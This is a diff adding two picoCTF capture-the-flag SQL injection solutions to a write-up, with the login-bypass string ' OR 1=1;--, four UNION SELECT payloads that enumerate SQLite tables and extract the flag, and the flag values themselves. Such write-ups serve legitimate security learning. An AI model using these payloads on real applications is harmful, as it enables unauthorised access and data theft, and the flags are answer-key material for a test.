@@ -213,3 +213,37 @@ Do note that that file is where the flag is
 
 **Flag:** picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
 
+## SQLiLite
+
+**Categories:** SQLi
+
+![image](https://github.com/user-attachments/assets/8e6fed4a-6fd4-4dfe-9f04-cc51ef833f4b)
+
+Password is **' OR 1=1;--**
+
+![image](https://github.com/user-attachments/assets/ebf32426-0fe5-4baa-8bd8-609750c2536d)
+
+**Flag:** picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
+
+## More SQLi
+
+**Categories:** SQLi
+
+![image](https://github.com/user-attachments/assets/03d9a293-19d9-4479-b2db-98ea6e1882bb)
+
+Password is again **' OR 1=1;--**
+
+![image](https://github.com/user-attachments/assets/d2823264-0901-4502-a9fe-64acf0981e94)
+
+
+**Payloads used:**
+
+```
+' UNION SELECT 1,2,3--
+' UNION SELECT tbl_name,sql,null FROM sqlite_master WHERE type='table'--
+' UNION SELECT name,null,null FROM PRAGMA_TABLE_INFO('more_table')--
+' UNION SELECT flag,id,null FROM more_table--
+```
+![image](https://github.com/user-attachments/assets/17e5745a-48b3-4020-8f65-d92244ecc36f)
+
+**Flag:** picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_c8b7cc2a}
